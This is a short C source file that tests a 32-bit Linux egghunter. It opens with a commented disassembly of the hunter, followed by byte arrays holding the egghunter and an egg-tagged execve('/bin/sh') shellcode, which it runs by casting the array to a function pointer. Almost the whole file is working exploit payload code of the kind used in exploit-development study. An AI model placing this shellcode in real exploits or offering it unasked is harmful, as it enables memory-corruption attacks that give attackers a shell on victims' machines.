/*
Egghunter shellcode tester
-------------------------------
  
  
Disassembly of section .text:

08048080 <_start>:
 8048080:   bb 90 50 90 50          mov    $0x50905090,%ebx
 8048085:   31 c9                   xor    %ecx,%ecx
 8048087:   f7 e1                   mul    %ecx

08048089 <next_page>:
 8048089:   66 81 ca ff 0f          or     $0xfff,%dx

0804808e <next_addr>:
 804808e:   42                      inc    %edx
 804808f:   60                      pusha  
 8048090:   8d 5a 04                lea    0x4(%edx),%ebx
 8048093:   b0 21                   mov    $0x21,%al
 8048095:   cd 80                   int    $0x80
 8048097:   3c f2                   cmp    $0xf2,%al
 8048099:   61                      popa   
 804809a:   74 ed                   je     8048089 <next_page>
 804809c:   39 1a                   cmp    %ebx,(%edx)
 804809e:   75 ee                   jne    804808e <next_addr>
 80480a0:   39 5a 04                cmp    %ebx,0x4(%edx)
 80480a3:   75 e9                   jne    804808e <next_addr>
 80480a5:   ff e2                   jmp    *%edx
 
*/

#include <stdio.h>
#include <string.h>

#define     EGG     "\x90\x50\x90\x50"

unsigned char sled[] = "Some misc bytes here";
unsigned char egghunter[] = 
        "\xbb\x90\x50\x90\x50\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42" 
        "\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a"
        "\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2";
unsigned char garbage[] = "Garbage, mangled bytes, whatever";
// execve(/bin/sh,..) shellcode here 
unsigned char shellcode[] = EGG EGG
        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
                "\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

// Function pointer
typedef int (*func_ptr)();

void main() {
    printf("Egghunter length: %d bytes\n", strlen(egghunter));
    printf("Shellcode Length:  %d bytes\n", strlen(shellcode));

    ((func_ptr) egghunter)();
}